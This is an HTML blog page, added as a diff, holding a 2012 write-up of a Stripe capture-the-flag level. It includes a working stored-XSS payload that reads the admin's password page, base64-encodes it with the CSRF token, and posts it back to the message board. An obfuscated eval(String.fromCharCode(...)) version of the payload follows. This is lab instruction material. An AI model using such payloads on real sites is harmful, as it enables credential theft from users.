@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <link href='//fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700,400italic' rel='stylesheet' type='text/css'>
+  <link rel="stylesheet" type="text/css" href="../../../../../theme/css/style.min.css">
+  <link rel="stylesheet" type="text/css" href="../../../../../theme/css/pygments.min.css">
+  <link rel="stylesheet" type="text/css" href="../../../../../theme/css/font-awesome.min.css">
+  <link href="../../../../..//extras/style.css" rel="stylesheet">
+  <link href="https://allyourbase.utouch.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="All Your Base Are Belong To Me Atom">
+  <link rel="shortcut icon" href="/extras/favicon.ico" type="image/x-icon">
+  <link rel="icon" href="/extras/favicon.ico" type="image/x-icon">
+
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="" />
+<meta name="author" content="useless" />
+<meta name="description" content="You can find the code for this level here. (sha256: 0fed78164db1eced67ff8eeba0998c81901880b293667f63f74e2838e63d2bf3) This level is a message board: you can share updates with your friends. The only thing is, you can't put messages with quotes and double quotes, in order to prevent SQL injection. You also can't change your ..." />
+<meta name="keywords" content="">
+<meta property="og:site_name" content="All Your Base Are Belong To Me"/>
+<meta property="og:title" content="Stripe CTF: Level #6"/>
+<meta property="og:description" content="You can find the code for this level here. (sha256: 0fed78164db1eced67ff8eeba0998c81901880b293667f63f74e2838e63d2bf3) This level is a message board: you can share updates with your friends. The only thing is, you can't put messages with quotes and double quotes, in order to prevent SQL injection. You also can't change your ..."/>
+<meta property="og:locale" content="en_US"/>
+<meta property="og:url" content="../../../../../posts/2012/10/28/stripe-ctf-level-6/"/>
+<meta property="og:type" content="article"/>
+<meta property="article:published_time" content="2012-10-28 12:42:00+01:00"/>
+<meta property="article:modified_time" content=""/>
+<meta property="article:author" content="../../../../../author/useless.html">
+<meta property="article:section" content="Write-up"/>
+<meta property="og:image" content="/images/useless_profile_pic.jpg">  <title>All Your Base Are Belong To Me &ndash; Stripe CTF: Level #6</title>
+</head>
+<body>
+  <aside>
+    <div>
+      <a href="../../../../..">
+        <img src="/images/useless_profile_pic.jpg" alt="All Your Base Are Belong To Me" title="All Your Base Are Belong To Me">
+      </a>
+      <h1><a href="../../../../..">All Your Base Are Belong To Me</a></h1>
+      <p>You know, if that's alright with you</p>
+      <nav>
+        <ul class="list">
+        </ul>
+      </nav>
+      <ul class="social">
+        <li><a class="sc-envelope-o" href="mailto:yannick at meheut dot org" target="_blank"><i class="fa fa-envelope-o"></i></a></li>
+        <li><a class="sc-github" href="https://github.com/the-useless-one/" target="_blank"><i class="fa fa-github"></i></a></li>
+        <li><a class="sc-rss" href="https://allyourbase.utouch.fr/feeds/all.atom.xml" target="_blank"><i class="fa fa-rss"></i></a></li>
+      </ul>
+    </div>
+  </aside>
+  <main>
+    <nav>
+      <a href="../../../../..">Home</a>
+      <a href="/archives.html">Archives</a>
+      <a href="/categories.html">Categories</a>
+      <a href="https://allyourbase.utouch.fr/feeds/all.atom.xml">Atom</a>
+    </nav>
+
+<article>
+  <header>
+    <h1 id="stripe-ctf-level-6">Stripe CTF: Level #6</h1>
+    <p>Posted on dim. 28 octobre 2012 in <a href="../../../../../category/write-up.html">Write-up</a></p>
+  </header>
+  <div>
+    <img alt="level06-logo.jpg" class="align-center" src="/images/stripe-ctf-level-6/level06-logo.jpg" />
+<p>You can find the code for this level
+<a class="reference external" href="/docs/stripe-ctf-level-6/stripe-ctf-level06.tar.gz">here</a>.</p>
+<p>(sha256:
+<code>0fed78164db1eced67ff8eeba0998c81901880b293667f63f74e2838e63d2bf3</code>)</p>
+<p>This level is a message board: you can share updates with your
+friends. The only thing is, you can't put messages with quotes and
+double quotes, in order to prevent SQL injection. You also can't change
+your password, but don't worry, it's visible on your profile page. Can
+we use this to retrieve the admin's password?</p>
+<p>This level is a lot like level #4. When you post a message, the
+server only checks for quotes and double quotes, not for script tags.
+So, we can post a message consisting of javascript code which will
+retrieve the password and post it on the board. But we can't use quotes
+or double quotes: we'll have to obfuscate our code. And since the
+admin's password contains quotes and double quotes, we'll have to
+obfuscate it as well before we post it to the board. I chose to use
+base64, and I found a javascript implementation
+<a class="reference external" href="http://www.webtoolkit.info/javascript-base64.html">here</a>.</p>
+<div class="highlight"><pre><span class="kd">function</span> <span class="nx">pwn_password</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">xml_password</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+    <span class="nx">xml_password</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+
+    <span class="nx">xml_password</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="s2">&quot;/user_info&quot;</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+    <span class="nx">xml_password</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">password_page</span> <span class="o">=</span> <span class="nx">xml_password</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
+
+    <span class="kd">var</span> <span class="nx">csrf_token</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">new_post</span><span class="p">.</span><span class="nx">elements</span><span class="p">[</span><span class="s1">&#39;_csrf&#39;</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>
+
+    <span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="s2">&quot;title=password&amp;body=&quot;</span> <span class="o">+</span>
+    <span class="nx">escape</span><span class="p">(</span><span class="nx">Base64</span><span class="p">.</span><span class="nx">encode</span><span class="p">(</span><span class="nx">escape</span><span class="p">(</span><span class="nx">password_page</span><span class="p">)))</span> <span class="o">+</span> <span class="s2">&quot;&amp;_csrf=&quot;</span> <span class="o">+</span>
+    <span class="nx">escape</span><span class="p">(</span><span class="nx">csrf_token</span><span class="p">);</span>
+
+    <span class="kd">var</span> <span class="nx">xml_post</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+    <span class="nx">xml_post</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+
+    <span class="nx">xml_post</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;POST&quot;</span><span class="p">,</span> <span class="s2">&quot;/posts&quot;</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+    <span class="nx">xml_post</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&quot;Content-Type&quot;</span><span class="p">,</span>
+    <span class="s2">&quot;application/x-www-form-urlencoded&quot;</span><span class="p">);</span>
+    <span class="nx">xml_post</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&quot;Content-Length&quot;</span><span class="p">,</span> <span class="nx">params</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+    <span class="nx">xml_post</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&quot;Connection&quot;</span><span class="p">,</span> <span class="s2">&quot;keep-alive&quot;</span><span class="p">);</span>
+    <span class="nx">xml_post</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="nx">pwn_password</span><span class="p">();</span>
+<span class="p">}</span>
+</pre></div>
+<p>We'll obfuscate it using String.fromCharCode (the following result
+contains also the base64 function):</p>
+<div class="highlight"><pre><span class="nt">&lt;/script&gt;&lt;script&gt;</span><span class="nb">eval</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mi">47</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="p">[...]</span> <span class="mi">41</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">125</span><span class="p">,</span> <span class="mi">10</span><span class="p">));</span><span class="nt">&lt;/script&gt;&lt;script&gt;</span>
+<span class="c">&lt;!-- The result is too big to be displayed entirely --&gt;</span>
+</pre></div>
+<p>Let's post this and wait for the admin to log in.</p>
+<img alt="level06-form.png" class="align-center" src="/images/stripe-ctf-level-6/level06-form.png" />
+<p>Now, we check the source code, and we see some base64-encoded stuff.</p>
+<img alt="level06-source.png" class="align-center" src="/images/stripe-ctf-level-6/level06-source.png" />
+<p>We just have to decode it.</p>
+<img alt="level06-base64-decoded.png" class="align-center" src="/images/stripe-ctf-level-6/level06-base64-decoded.png" />
+<p>We URL decode it, to clean a little bit:</p>
+<img alt="level06-w00t.png" class="align-center" src="/images/stripe-ctf-level-6/level06-w00t.png" />
+<p>w00t!</p>
+
+  </div>
+  <div class="tag-cloud">
+    <p>
+    </p>
+  </div>
+</article>
+
+    <footer>
+<p>
+  &copy; Yannick Méheut 2016 - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>
+</p>
+<p>Built using <a href="http://getpelican.com" target="_blank">Pelican</a> - <a href="https://github.com/alexandrevicenzi/flex" target="_blank">Flex</a> theme by <a href="http://alexandrevicenzi.com" target="_blank">Alexandre Vicenzi</a></p><p>
+  <a rel="license"
+     href="http://creativecommons.org/licenses/by-sa/4.0/"
+     target="_blank">
+    <img alt="Creative Commons License"
+         title="Creative Commons License"
+         style="border-width:0"
+         src="https://i.creativecommons.org/l/by-sa/4.0/80x15.png"
+         width="80"
+         height="15"/>
+  </a>
+</p>    </footer>
+  </main>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BlogPosting",
+  "name": "Stripe CTF: Level #6",
+  "headline": "Stripe CTF: Level #6",
+  "datePublished": "2012-10-28 12:42:00+01:00",
+  "dateModified": "",
+  "author": {
+    "@type": "Person",
+    "name": "useless",
+    "url": "../../../../../author/useless.html"
+  },
+  "image": "/images/useless_profile_pic.jpg",
+  "url": "../../../../../posts/2012/10/28/stripe-ctf-level-6/",
+  "description": "You can find the code for this level here. (sha256: 0fed78164db1eced67ff8eeba0998c81901880b293667f63f74e2838e63d2bf3) This level is a message board: you can share updates with your friends. The only thing is, you can't put messages with quotes and double quotes, in order to prevent SQL injection. You also can't change your ..."
+}
+</script></body>
+</html>
